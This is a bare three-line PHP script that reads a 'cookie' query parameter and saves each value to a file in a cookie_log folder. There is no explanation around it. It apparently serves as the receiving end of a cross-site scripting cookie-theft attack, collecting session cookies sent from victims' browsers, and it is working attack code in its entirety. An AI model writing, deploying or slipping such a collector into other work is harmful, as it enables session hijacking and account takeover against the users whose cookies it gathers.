<?php
$s = serialize(@$_GET['cookie']);
file_put_contents('./cookie_log/' . md5($s), $s);